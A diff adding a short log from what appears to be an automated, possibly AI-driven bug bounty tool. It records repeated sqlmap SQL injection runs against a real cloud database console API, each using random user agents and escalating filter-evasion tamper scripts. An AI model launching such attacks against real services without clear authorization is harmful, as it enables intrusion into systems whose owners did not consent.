@@ -1,0 +1,11 @@
+2026-05-08 19:43:06,183 - Assistant - ERROR - Execution Error: 503 UNAVAILABLE. {'error': {'code': 503, 'message': 'This model is currently experiencing high demand. Spikes in demand are usually temporary. Please try again later.', 'status': 'UNAVAILABLE'}}
+2026-05-08 19:43:24,650 - Assistant - ERROR - Execution Error: 503 UNAVAILABLE. {'error': {'code': 503, 'message': 'This model is currently experiencing high demand. Spikes in demand are usually temporary. Please try again later.', 'status': 'UNAVAILABLE'}}
+2026-05-08 19:43:37,652 - Assistant - INFO - Starting sequential audit for 1 items.
+2026-05-08 19:43:55,027 - Assistant - WARNING - No JWT found in the current session cookies.
+2026-05-08 19:43:55,028 - Assistant - ERROR - Scan aborted: No JWT detected to test.
+2026-05-08 19:43:59,604 - Assistant - INFO - Launching SQLmap: sqlmap --batch --random-agent --risk=1 --level=1 --flush-session -u https://console.neon.tech/api/v2/projects/damp-hill-11954396 -p damp-hill-11954396 --tamper space2comment
+2026-05-08 19:44:32,725 - Assistant - INFO - System identity retrieved: alex
+2026-05-08 19:44:41,370 - Assistant - INFO - Launching SQLmap: sqlmap --batch --random-agent --risk=1 --level=1 --flush-session -r /home/alex/bugbountyassistant/storage/loot/sqlmap_target.txt -p * --tamper space2comment
+2026-05-08 19:45:14,112 - Assistant - INFO - Launching SQLmap: sqlmap --batch --random-agent --risk=1 --level=1 --flush-session -r /home/alex/bugbountyassistant/storage/loot/sqlmap_target.txt -p * --tamper space2comment,between
+2026-05-08 19:49:20,048 - Assistant - ERROR - Execution Error: 503 UNAVAILABLE. {'error': {'code': 503, 'message': 'This model is currently experiencing high demand. Spikes in demand are usually temporary. Please try again later.', 'status': 'UNAVAILABLE'}}
+2026-05-08 19:51:57,667 - Assistant - INFO - Launching SQLmap: sqlmap --batch --random-agent --risk=1 --level=1 --flush-session -r /home/alex/bugbountyassistant/storage/loot/sqlmap_target.txt -p damp-hill-11954396 --tamper space2comment,between,charencode
